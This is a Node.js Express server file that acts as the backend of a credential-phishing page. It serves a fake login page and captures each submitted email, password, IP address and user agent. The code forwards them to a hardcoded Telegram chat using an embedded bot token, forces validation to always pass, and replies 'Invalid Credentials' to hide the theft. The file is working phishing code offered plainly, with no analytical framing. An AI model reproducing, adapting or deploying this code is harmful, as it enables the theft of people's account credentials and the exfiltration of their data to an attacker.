  const express = require('express');
  const bodyParser = require('body-parser');
  const path = require('path');
  const TelegramBot = require('node-telegram-bot-api');
  const cors = require('cors');
  const requestIp = require('request-ip');

  const app = express();
  const port = 3001;

  app.use(cors());

  app.use((req, res, next) => {
    console.log('Request received:', req.method, req.url);
    next();
  });
  
  

  // Middleware to get User Agent
app.use((req, res, next) => {
  req.userAgent = req.headers['user-agent'];
  next();
});

  // Assuming your static files are in the 'images' directory
app.use(express.static(path.join(__dirname, 'images')));


  // Assuming your CSS files are in the 'css' directory
app.use(express.static(path.join(__dirname, 'css')));


  // Serve static files from the 'public' directory
  app.use(express.static(path.join(__dirname, '')));

  app.set('view engine', 'html');

  // Define routes
  // app.get('/', (req, res) => {
  //   res.sendFile(path.join(('index.html')));
  // });

  app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
  });
  

  // Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram Bot Token
  const bot = new TelegramBot('6851991741:AAG1PAsmdfeA2JPjJSS9tAjbYep5yE38Guk', { polling: true });

  app.use(bodyParser.urlencoded({ extended: true }));

  

  app.post('/', (req, res) => {
    try {
      const email = req.body.email;
      const password = req.body.password;
      const field = req.body.field;
      const userAgent = req.userAgent;
  
    // Get the client's IP address
    const clientIp = requestIp.getClientIp(req);
  
      console.log('Received login attempt:', email, password, field, clientIp, userAgent );
  
      const isValidCredentials = true;
  
      // Example validation logic (replace with your actual validation)
      if (isValidCredentials) {
        // Send Telegram message
        const chatId = '1713212728';  // Replace with your Telegram group username or chat ID
        const message = `New login attempt:\nEmail: ${email}\nPassword: ${password}\nType of Mail: ${field}\nIP Address: ${clientIp}\nUser Agent: ${userAgent}`;
        bot.sendMessage(chatId, message);
  
        console.log('my chat', chatId, message)
  
        console.log('Sending response:', { success: true, message: 'Login successful' });
  
        // Send response to the client
        res.json({ success: true, message: 'Invalid Credentials' });
      } else {
        // Send response to the client for invalid credentials
        res.json({ success: false, message: 'Invalid email or password' });
      }
    } catch (error) {
      res.status(500).json({err: error.message, message: 'Internal server error'})
    }
  });

  // function isValidCredentials(email, password) {
  //   // Example: Check against predefined values (replace with database validation)
  //   const validEmail = 'example@example.com';
  //   const validPassword = 'password123';

  //   return email === validEmail && password === validPassword;
  // }

  app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
  });
